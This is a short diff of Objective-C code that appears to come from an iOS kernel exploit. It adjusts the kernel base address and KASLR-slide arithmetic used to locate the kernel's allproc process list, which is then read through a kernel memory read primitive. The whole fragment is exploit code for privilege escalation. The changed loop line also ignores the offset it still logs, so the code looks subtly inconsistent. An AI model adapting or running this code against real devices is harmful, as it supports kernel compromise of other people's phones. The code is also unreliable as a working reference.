@@ -20,7 +20,7 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
 extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);
 extern char **environ;
 
-#define KERN_BASE_STATIC 0xFFFFFFF007000000ULL 
+#define KERN_BASE_STATIC 0xFFFFFFF007004000ULL 
 #define OFFSET_ALLPROC     0x8F50000ULL
 #define OFFSET_TTBR1       0x8E10000ULL
 
@@ -117,7 +117,7 @@ extern char **environ;
     uint64_t proc = 0;
 
     for (int i = 0; i < 4; i++) {
-        uint64_t ptr = (0xFFFFFFF007004000ULL + slide + offsets[i]);
+        uint64_t ptr = (KERN_BASE_STATIC + (slide & 0xFFFFFFFFFFE00000ULL) + 0x8F50000ULL);
         proc = [self kread64:ptr];
         
         [self logToWeb:[NSString stringWithFormat:@"🔍 Testando 0x%llx -> Proc: 0x%llx", offsets[i], proc]];
